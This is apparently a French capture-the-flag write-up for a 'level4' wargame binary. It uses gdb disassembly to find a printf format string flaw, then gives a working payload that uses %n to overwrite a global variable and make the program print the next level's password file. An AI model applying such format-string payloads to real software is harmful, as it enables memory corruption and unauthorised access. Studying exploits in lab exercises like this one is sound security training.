## Level 4

### Analyse
La fonction n lit l'input avec fgets puis le passe à p qui appelle printf sans format string — vulnérabilité format string. Après l'appel, n vérifie si la variable globale m (0x8049810) vaut 0x1025544 (16930116). Si oui, elle exécute system("/bin/cat /home/user/level5/.pass").

```bash
(gdb) disas n
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax       # variable globale m
   0x08048492 <+59>:    cmp    $0x1025544,%eax      # comparaison avec 16930116
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x080484a0 <+73>:    call   0x8048360 <system@plt>

(gdb) disas p
   0x08048450 <+12>:    call   0x8048340 <printf@plt>  # printf sans format string

(gdb) x/s 0x8048590
0x8048590:       "/bin/cat /home/user/level5/.pass"
```


### Exploitation
On trouve la position de notre buffer dans la stack : 12ème argument.

```bash
$ python -c 'print "BBBB"+" %x"*15' | ./level4
BBBB b7ff26b0 bffff694 b7fd0ff4 0 0 bffff658 804848d bffff450 200 b7fd1ac0 b7ff37d0 42424242 ...
```
On écrit l'adresse de m en début de payload, puis on utilise %n pour y écrire le nombre de caractères affichés. %16930112d génère 16930112 caractères supplémentaires, soit 16930112 + 4 (adresse) = 16930116 = 0x1025544.

```bash
$ (python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"'; cat) | ./level4
```
